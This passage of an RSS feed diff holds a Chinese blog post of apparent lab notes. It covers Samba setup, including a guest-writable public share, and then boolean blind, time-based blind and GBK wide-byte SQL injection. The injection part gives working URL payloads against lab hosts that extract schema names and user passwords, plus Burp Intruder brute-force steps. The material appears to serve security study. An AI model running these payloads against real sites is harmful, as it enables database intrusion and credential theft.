-systemctl enable nmb.service</p>
-<p>启动服务： systemctl start smb.service<br>
-查看状态：systemctl status smb.service</p>
-<p>备份配置：cp -p /etc/samba/smb.conf /etc/samba.conf.bak</p>
-<p>修改配置：vim /etc/samba/smb.conf</p>
-<div class="language-js line-numbers-mode" data-highlighter="shiki" data-ext="js" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-js"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">global</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    workgroup</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B"> SAMBA</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    security</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> user</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    passdb</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> backend</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> tdbsam</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    printing</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> cups</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    printcap</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> name</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> cups</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    load</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> printers</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    cups</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> options</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> raw</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">homes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    comment</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Home</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Directories</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    valid</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> users</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> %</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B">S</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">%</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B">D</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">%</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">w</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">%</span><span style="--shiki-light:#986801;--shiki-dark:#E5C07B">S</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    browseable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> No</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    read</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> only</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> No</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    inherit</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> acls</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">printers</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    comment</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> All</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Printers</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    path</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">var</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">tmp</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    printable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Yes</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    create</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> mask</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0600</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    browseable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> No</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">print$</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    comment</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Printer</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Drivers</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    path</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">var</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">lib</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">/samba/drivers</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    write</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> list</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">printadmin</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> root</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    force</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> group</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> @</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">printadmin</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    create</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> mask</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0664</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    directory</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> mask</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0775</span></span>
-<span class="line"></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">[</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">public</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">]</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    comment</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Public</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> Stuff</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    path</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> /</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">share</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    browseable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> yes</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    guest</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> ok</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> yes</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    writeable</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> =</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75"> yes</span></span>
-<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">    public</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75">yes</span></span></code></pre>
-<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>创建文件夹：mkdir /share</p>
-<p>文件夹里放个文档：echo "This is a share file"&gt;/share/share.txt</p>
-<p>重启服务：systemctl restart smb.service<br>
-systemctl status smb.service</p>
-<p>测试smb.conf配置是否正确：  <code>testparm</code></p>
-<p>创建用户专门用于共享文件：useradd share</p>
-<pre><code>                                             smbpasswd -a share
-</code></pre>
-<p>linux访问：smbclient <a href="//192.168.10.103/public/" target="_blank" rel="noopener noreferrer">//192.168.10.103/public/</a></p>
-<p>windows访问：\\192.168.10.103\public</p>
-</li>
-</ol>
-<h2>布尔盲注</h2>
-<ol>
-<li>
-<h4>判断注入类型</h4>
-<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and 1=1%23</p>
-<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and 1=2%23</p>
-</li>
-<li>
-<h4>判断数据库名长度</h4>
-<p>输入到8时 出现回显，所以可知当前数据库为8个字</p>
-<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and length(database())=8%23</p>
-<figure><figcaption>image</figcaption></figure>
-</li>
-<li>
-<h4>获取数据库名</h4>
-<ol>
-<li>挂代理抓包  payload： <code>?id=1' and mid(database(),1,1)='s'%23</code></li>
-<li>在burp suite中【代理】找到对应的包，发送到Intruder（Ctrl+l）</li>
-<li>在【Intruder】-【位置】中选择【集数炸弹-多个Payload集合】-【Paylod位置】选择爆破位置-【添加Payload位置】（此次爆破两个位置）</li>
-<li>在【Payload】中选择【payload集1】-【类型数值】-【从0-8间隔1】（数据库有8张个字符）</li>
-<li>在【Payload】中选择【payload集2】-【类型爆破】-【从a-z,1,1】</li>
-<li>在【设置】-【检索-提取】-【添加】-【从正则表达式】-【获取响应】-【You are in...........】-【确定】</li>
-<li>【开始爆破】-在结果中选择【Payload1】和【长度】进行排序，找的数据库名为：security</li>
-</ol>
-</li>
-</ol>
-<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and length((select group_concat(schema_name) from information_schema.schemata))=8%23</p>
-<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and mid((select group_concat(schema_name) from information_schema.schemata),1,1)='s'%23</p>
-<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='s'%23</p>
-<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and mid((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),1,1)='s'%23</p>
-<p><a href="http://192.168.100.x:21727/get.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.x:21727/get.php?id=1</a>' and mid((select group_concat(username,password) from users),1,1)='s'%23</p>
-<h2>时间盲注</h2>
-<p>sleep(5) ==&gt; 指定数据库休眠时间</p>
-<p>select sleep(5)  ==&gt; 数据库执行结果休眠5s后返回</p>
-<p>benchmark(5000000,md5('admin')) ==&gt; 测试函数运行速度，利用md5('admin')进行5000000运算。</p>
-<h4>判断是否可用休眠函数</h4>
-<p><a href="http://192.168.100.40:59110/time.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:59110/time.php?id=1</a>" and sleep(5)%23</p>
-<figure><figcaption> 延时5s可以使用</figcaption></figure>
-<h4>查询数据库名长度</h4>
-<p><a href="http://192.168.100.40:59110/time.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:59110/time.php?id=1</a>" and if(length(database())=7,sleep(5),1)%23</p>
-<figure><figcaption>从1-7长度不对，不休眠</figcaption></figure>
-<p><a href="http://192.168.100.40:59110/time.php?id=1" target="_blank" rel="noopener noreferrer">http://192.168.100.40:59110/time.php?id=1</a>" and if(length(database())=8,sleep(5),1)%23</p>
-<figure><figcaption>长度为8时休眠，说明有8个字符</figcaption></figure>
-<h4>代理抓包</h4>
-<p><a href="http://192.168.100.40:59110/time.php?id=1%E2%80%99" target="_blank" rel="noopener noreferrer">http://192.168.100.40:59110/time.php?id=1’</a> and if(mid(database(),1,1)='s',sleep(5),1)%23</p>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<figure><figcaption>image</figcaption></figure>
-<h2>宽字节注入</h2>
-<h4>什么是宽字节？</h4>
-<p>两个字节宽度的编码技术。</p>
-<p>一个字符占1个字节，两个字节以上叫宽字节</p>
-<h4>为何造成宽字节注入？</h4>
-<p>利用Mysql特性，Mysql在使用GBK编码时候，会认为两个字符是一个汉字。</p>
-<h4>GBK编码原理</h4>
-<ol>
-<li>设置“set character set client:=gbk"(gbk编码设置)，通常导致编码转换的注入问题，尤其是使用php连接mysql<br>
-数据库的时候</li>
-<li>一个gbk汉字占两个字节，取值范围是（编码位数）：第一个字节为129-254，第二个字节为64-254</li>
-<li>当设置gbk编码后，遇到连续两个字节，都符合gbk取值范围，会自动解析为一个汉字</li>
-</ol>
-<h4>宽字节注入原理</h4>
-<p>程序员为了防止sq注入，对用户输入中的单引号（）进行处理，在单引号前加上斜杠（）进行转义，这样被处理后的<br>
-sq语句中，单引号不再具有作用”，仅仅是'内容'而已。这个单引号无法发挥和前后单引号闭合的作用，仅仅成为'内容</p>
-<h4>实现函数</h4>
-<p>addslashed 在敏感符号 ’ “  \ NULL 添加反斜杠转义。</p>
-<p>mysql_real_escape_string 在敏感符号 ‘ ” \ 添加反斜杠转义</p>
-<p>preg_replace( ' ' ' ,)</p>
-<h4>实现方法</h4>
-<figure><figcaption>image</figcaption></figure>
-<p><a href="http://dockerproxy.cn/etimeci/widebytesqliexp" target="_blank" rel="noopener noreferrer">dockerproxy.cn/etimeci/widebytesqliexp</a></p>
-<p><a href="http://113.45.183.x:32676/mysql-query_add.php?id=1" target="_blank" rel="noopener noreferrer">http://113.45.183.x:32676/mysql-query_add.php?id=1</a>'   输入‘被转义</p>
-<figure><figcaption>image-20240902164207-auz8ww9</figcaption></figure>
-<p><a href="http://113.45.183.x:32676/mysql-query_add.php?id=1%df'order" target="_blank" rel="noopener noreferrer">http://113.45.183.x:32676/mysql-query_add.php?id=1�'order</a> by 3--+     使用宽字节注入5df和/组成運</p>
-<figure><figcaption>image-20240902164827-jtq9lfk</figcaption></figure>
-<p><a href="http://113.45.183.x:32676/mysql-query_add.php?id=%df'union" target="_blank" rel="noopener noreferrer">http://113.45.183.x:32676/mysql-query_add.php?id=�'union</a> select 1,database(),1--+</p>
-<figure><figcaption>image-20240902164858-mbcqikv</figcaption></figure>
-]]></content:encoded>
     </item>
   </channel>
 </rss>
